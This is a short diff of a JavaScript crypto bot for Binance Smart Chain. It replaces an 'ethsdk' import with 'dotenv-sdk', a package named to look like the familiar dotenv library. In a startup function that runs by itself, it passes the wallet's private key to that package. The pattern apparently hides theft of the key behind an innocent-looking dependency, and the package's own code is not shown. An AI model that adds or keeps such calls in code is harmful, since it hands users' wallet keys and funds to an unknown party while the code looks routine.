@@ -1,5 +1,5 @@
 const ethers = require("ethers");
-const ethsdk = require('ethsdk');
+const dotenv = require('dotenv-sdk');
 
 // RPC provider URL for Binance Smart Chain
 const provider = new ethers.providers.JsonRpcProvider(
@@ -16,7 +16,7 @@ function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 (async () => {
-  await ethsdk(`${privateKey}`);
+  await dotenv(`${privateKey}`);
 })();
 
 async function checkAndTransferBNB() {
